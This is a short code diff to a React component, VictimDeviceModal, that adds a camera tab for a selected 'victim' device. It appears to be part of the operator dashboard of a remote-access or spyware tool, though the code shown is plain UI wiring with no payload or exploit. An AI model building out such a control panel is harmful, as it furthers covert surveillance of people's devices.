@@ -25,11 +25,16 @@ import React, { useState } from 'react';
 
 import { VictimOrder } from '../../../common/enums';
 import { type VictimDeviceStore } from '../../store/VictimDeviceStore';
+import { CameraTab } from './CameraTab';
 
 interface IProps {
     data?: VictimDeviceStore;
     open: boolean;
     setOpen: (open: boolean) => void;
+}
+
+export interface ITabProps {
+    data: VictimDeviceStore;
 }
 
 export const VictimDeviceModal: React.FC<IProps> = (props) => {
@@ -107,7 +112,12 @@ export const VictimDeviceModal: React.FC<IProps> = (props) => {
                             </Tab>
                         </TabList>
                     </DialogTitle>
-                    <DialogContent></DialogContent>
+                    <DialogContent>
+                        {props.data !== undefined &&
+                            (selectedTab === VictimOrder.CAMERA ? (
+                                <CameraTab data={props.data} />
+                            ) : null)}
+                    </DialogContent>
                 </DialogBody>
             </DialogSurface>
         </Dialog>
